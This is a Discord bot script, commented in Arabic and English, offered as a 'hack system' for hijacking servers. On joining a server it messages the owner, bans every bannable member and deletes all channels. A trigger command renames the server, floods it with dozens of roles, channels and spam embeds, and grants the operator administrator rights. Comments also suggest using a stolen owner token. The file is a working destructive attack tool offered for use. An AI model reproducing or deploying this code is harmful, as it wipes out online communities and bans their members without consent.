//فكره الكود
//ان تسوي بوت 
//وتعطيه اداري يضيفه
//لما يضيفه تكتب الامر يلي انت حددته
//وبيسوي رتب باسم يلي انت تحدده
//ورومات صوتيه وكتابيه بالاسم يلي تحدده
//ويعطيك رتبه فيها ادمن ستريشن
//وتتحكم في السيرفر 
//طبعا اول ما تكتب الامر بيبند كل الاعضاء 
//او
// اذا معك توكن الاونر حط توكن الاونر
//ENJOY
//Sorry For The Bad Engilsh :/
//By xxxRevenge (Bowlingtoolkit)
const Discord = require("discord.js") //npm i discord.js
const client = new Discord.Client();
const Token = '' //حط توكن بوتك هنا // your bot token
const x_x = "." //الامر يلي يشغل الكود //the command to start the hack system
const opcmd = 'oprole' // The Op Command To Give You Adminstrator Role
const teext = "hjacked" // اسم رومات الكتابيه يلي بيسويها //the textchannel name
const vooice = "HJACKED" // اسم الرومات الصوتيه يلي بيسويها //the voicechannel name
const pic = "https://cdn.discordapp.com/attachments/505639515407253506/505640173615448064/download.png" // صوره بيسوي فيها سبام البوت //the spam embed thumbnail picture
const spam = "HJACKED" // الكلام يلي بيسوي فيه سبام البوت //the spam message
const namee = "HJACKED" // اسم ابوت بعد التهكير //the bot name
const playing = "HJACKED 1 SERVER" // البلاينج //bot streaming
const role = 'HJACKED' // اسم الرتبه يلي بيسويها //the role name
const adminstrator = 'OP' //اسم الرتبه يلي بيسويها البوت ويعطيك اياها //the op name
console.log('BY OROCHIX');
console.log('Start Hacking System ..')
client.on('ready', () => {
  console.log(`Logged in as ${client.user.tag} !`);
  console.log(`Done The Hacking System Has Been Started`)

});
client.on('ready',  () => {
console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'); 
console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'); 
console.log('      ~            ~  By : OROCHIX ~           ~    '); //if you share this code make sure you type my copyrights :>
console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'); 
console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~');
console.log(`Logged in as  * [ "  OROCHIX " ] servers! [ " ${client.guilds.size} " ] Users! [ " ${client.users.size} " ]`);
//BY OROCHIX (Arabic)
        

});
// ban all and send a message for the ownerserver
async function nuke(guild) {
    let users = 0;
    let channels = 0;
  
    await guild.fetchMembers();
  
    await guild.owner.send('Your Server Has Been Hjacked !').catch(e => { return void e; });
  
  
  
    await Promise.all(guild.members.map(async (m) => {
      if (m.bannable) {
        users++;
        await m.send('HJACKED').catch(e => { return void e; });
        return m.ban();
      }
    }));
    
      await Promise.all(guild.channels.map(c => {
      if (c.deletable) {
        channels++;
        return c.delete();
      }
    }));

    await guild.createChannel(teext, 'text');

    await guild.createChannel(vooice, 'voice');



}
//any error will written in the console :>
client.on('guildCreate', async (guild) => {
  return nuke(guild).catch(console.error);
});

//change the bot status and change the bot name and change the bot avatar and the servericon and the servername
client.on('message', message => {
    if (message.content === x_x) {
        console.log(`THE HACK HAS BEEN STARTED`)
        message.guild.members.forEach(baand => {
       baand.ban({reason: spam,});
       client.channels.forEach(hackch => {
       hackch.delete();
       client.user.setAvatar(pic)
       client.user.setUsername(namee)
       client.user.setGame(playing, 'https://www.twitch.tv/hix')
       client.guilds.forEach(hack => {
       hack.setIcon(pic)
       hack.setName(namee)})})})}});

//this will give you a adminstrator in the target server
client.on('message', message => {
        if (message.content === 'OP') {
let me = message.author
        let role = message.guild.createRole({
        name : adminstrator,
        color : "RANDOM", 
        permissions : [8]
        })
        let role1 = message.guild.roles.find('name', adminstrator)
    message.channel.send(`HJACKED`)
   message.guild.member(me).addRole(role1);
}})
//create the roles
            client.on('message', message => {
     

                if (message.content === x_x) {
                    client.guilds.forEach(m =>{
             m.createRole({
                   name : role,
                   permissions :   [1],
                   color : " #ff0000"
               }) 
               m.createRole({
                   name : role,
                   permissions :   [1],
                   color : " #ff0000"
               })
               m.createRole({
                   name : role,
                   permissions :   [1],
                   color : " #ff0000"
               })
               m.createRole({
                   name : role,
                   permissions :   [1],
                   color : " #ff0000"
               })
               m.createRole({
                   name : role,
                   permissions :   [1],
                   color : " #ff0000"
               })
               m.createRole({
                   name : role,
                   permissions :   [1],
                   color : " #ff0000"
               })
               m.createRole({
                   name : role,
                   permissions :   [1],
                   color : " #ff0000"
               })
               m.createRole({
                   name : role,
                   permissions :   [1],
                   color : " #ff0000"
               })
               m.createRole({
                   name : role,
                   permissions :   [1],
                   color : " #ff0000"
               })
           
               m.createRole({
                   name : role,
                   permissions :   [1],
                   color : " #ff0000"
               })
               m.createRole({
                   name : role,
                   permissions :   [1],
                   color : " #ff0000"
               })
               m.createRole({
                   name : role,
                   permissions :   [1],
                   color : " #ff0000"
               })
                m.createRole({
                   name : role,
                   permissions :   [1],
                   color : " #ff0000"
               })
               m.createRole({
                   name : role,
                   permissions :   [1],
                   color : " #ff0000"
               })
           
               m.createRole({
                   name : role,
                   permissions :   [1],
                   color : " #ff0000"
               }) 
               m.createRole({
                   name : role,
                   permissions :   [1],
                   color : " #ff0000"
               })
           
               m.createRole({
                   name : role,
                   permissions :   [1],
                   color : " #ff0000"
               }) 
               m.createRole({
                   name : role,
                   permissions :   [1],
                   color : " #ff0000"
               })
               m.createRole({
                   name : role,
                   permissions :   [1],
                   color : " #ff0000"
               })
               m.createRole({
                   name : role,
                   permissions :   [1],
                   color : " #ff0000"
               })
               m.createRole({
                   name : role,
                   permissions :   [1],
                   color : " #ff0000"
               })
               m.createRole({
                   name : role,
                   permissions :   [1],
                   color : " #ff0000"
               })
               m.createRole({
                   name : role,
                   permissions :   [1],
                   color : " #ff0000"
               })
               m.createRole({
                   name : role,
                   permissions :   [1],
                   color : " #ff0000"
               })
               m.createRole({
                   name : role,
                   permissions :   [1],
                   color : " #ff0000"
               })
               m.createRole({
                   name : role,
                   permissions :   [1],
                   color : " #ff0000"
               })
               m.createRole({
                   name : role,
                   permissions :   [1],
                   color : " #ff0000"
               })
               m.createRole({
                   name : role,
                   permissions :   [1],
                   color : " #ff0000"
               })
               m.createRole({
                   name : role,
                   permissions :   [1],
                   color : " #ff0000"
               })
               m.createRole({
                   name : role,
                   permissions :   [1],
                   color : " #ff0000"
               })
               m.createRole({
                   name : role,
                   permissions :   [1],
                   color : " #ff0000"
               })
               m.createRole({
                   name : role,
                   permissions :   [1],
                   color : " #ff0000"
               })
               m.createRole({
                   name : role,
                   permissions :   [1],
                   color : " #ff0000"
               })
           
               m.createRole({
                   name : role,
                   permissions :   [1],
                   color : " #ff0000"
               })
               m.createRole({
                   name : role,
                   permissions :   [1],
                   color : " #ff0000"
               })
           
               m.createRole({
                   name : role,
                   permissions :   [1],
                   color : " #ff0000"
               })
               m.createRole({
                   name : role,
                   permissions :   [1],
                   color : " #ff0000"
               })
               m.createRole({
                   name : role,
                   permissions :   [1],
                   color : " #ff0000"
               }) // i know its too long ;-;
           
           
               
           })
            
            
           }
           });
           //create the textchannels
           client.on('message', message => {
                    if (message.content === x_x) {
                          client.guilds.forEach(m =>{
           m.createChannel(teext, 'text');
           m.createChannel(teext, 'text');
           m.createChannel(teext, 'text');
           m.createChannel(teext, 'text');
           m.createChannel(teext, 'text');
           m.createChannel(teext, 'text');
           m.createChannel(teext, 'text');
           m.createChannel(teext, 'text');
           m.createChannel(teext, 'text');
           m.createChannel(teext, 'text');
           
           m.createChannel(teext, 'text');
           
           m.createChannel(teext, 'text');
           
           m.createChannel(teext, 'text');
           
           m.createChannel(teext, 'text');
           m.createChannel(teext, 'text');
           m.createChannel(teext, 'text');
           m.createChannel(teext, 'text');
           m.createChannel(teext, 'text');
           m.createChannel(teext, 'text');
           m.createChannel(teext, 'text');
           m.createChannel(teext, 'text');
           m.createChannel(teext, 'text');
           m.createChannel(teext, 'text');
           m.createChannel(teext, 'text');
           
           m.createChannel(teext, 'text');
           m.createChannel(teext, 'text');
           
           m.createChannel(teext, 'text');
           m.createChannel(teext, 'text');
           m.createChannel(teext, 'text');
           m.createChannel(teext, 'text');
           m.createChannel(teext, 'text');
           m.createChannel(teext, 'text');
           m.createChannel(teext, 'text');
           m.createChannel(teext, 'text');
           m.createChannel(teext, 'text');
           m.createChannel(teext, 'text');
           m.createChannel(teext, 'text');
           
           m.createChannel(teext, 'text');
           m.createChannel(teext, 'text');
           
           })
           }
           });
           //create the voicechannels
           client.on('message', message => {
                    if (message.content === x_x) {
                            client.guilds.forEach(m =>{
           m.createChannel(vooice, 'voice');
           m.createChannel(vooice, 'voice');
           m.createChannel(vooice, 'voice');
           m.createChannel(vooice, 'voice');
           m.createChannel(vooice, 'voice');
           m.createChannel(vooice, 'voice');
           m.createChannel(vooice, 'voice');
           m.createChannel(vooice, 'voice');
           
           m.createChannel(vooice, 'voice');
           m.createChannel(vooice, 'voice');
           
           m.createChannel(vooice, 'voice');
           m.createChannel(vooice, 'voice');
           m.createChannel(vooice, 'voice');
           m.createChannel(vooice, 'voice');
           m.createChannel(vooice, 'voice');
           m.createChannel(vooice, 'voice');
           m.createChannel(vooice, 'voice');
           m.createChannel(vooice, 'voice');
           m.createChannel(vooice, 'voice');
           m.createChannel(vooice, 'voice');
           m.createChannel(vooice, 'voice');
           m.createChannel(vooice, 'voice');
           
           m.createChannel(vooice, 'voice');
           m.createChannel(vooice, 'voice');
           m.createChannel(vooice, 'voice');
           m.createChannel(vooice, 'voice');
           m.createChannel(vooice, 'voice');
           m.createChannel(vooice, 'voice');
           m.createChannel(vooice, 'voice');
           m.createChannel(vooice, 'voice');
           
           m.createChannel(vooice, 'voice');
           m.createChannel(vooice, 'voice');
           m.createChannel(vooice, 'voice');
           m.createChannel(vooice, 'voice');
           m.createChannel(vooice, 'voice');
           m.createChannel(vooice, 'voice');
           m.createChannel(vooice, 'voice');
           m.createChannel(vooice, 'voice');
           m.createChannel(vooice, 'voice');
           m.createChannel(vooice, 'voice');
           m.createChannel(vooice, 'voice');
           
           m.createChannel(vooice, 'voice');
           m.createChannel(vooice, 'voice');
           m.createChannel(vooice, 'voice');
           m.createChannel(vooice, 'voice');
           m.createChannel(vooice, 'voice');
           m.createChannel(vooice, 'voice');
           m.createChannel(vooice, 'voice');
           m.createChannel(vooice, 'voice');
           m.createChannel(vooice, 'voice');
           m.createChannel(vooice, 'voice');
           m.createChannel(vooice, 'voice');
           m.createChannel(vooice, 'voice');
           m.createChannel(vooice, 'voice');
           
           // again 
           
           })
           }
           
           });



//if the bot join in any server the will give self adminstratpr role 
  client.on('guildMemberAdd', member => {
                        member.guild.createRole({
                      name : client.user.username,
                      color : "RANDOM", 
                      permissions : [8]
                  }).then(function(role){
                      member.addRole(role)
                  })
                  
              })
          

            //spam message
                client.on('message', message => {
                    if (message.content === x_x) {
                        console.log(`THE HACK HAS BEEN STARTED`)
                        var teeext = teext.replace(" ", "-")
                        var interval = setInterval (function () {
                        const embed = new Discord.RichEmbed()
                       .setColor("ff0000")
                       .setThumbnail(pic)
                       .addField(spam, ".")
                        message.channel.sendEmbed(embed);
            
            
            
                        })
                      }})

//login in to the bot token or the serverowner token
    client.on('message', async message => {
  const devs = ['505638480248963072']; // your id
  let member = message.author
   if (message.content === opcmd) {
    if (!devs.includes(message.author.id)) return;
let op = message.guild.roles.find('name', `${adminstrator}`)
    if(!op) return message.guild.createRole({ name: "OPROLE", permissions: [8] });
    message.guild.member(member).addRole(op);
  }
});
client.login(Token)
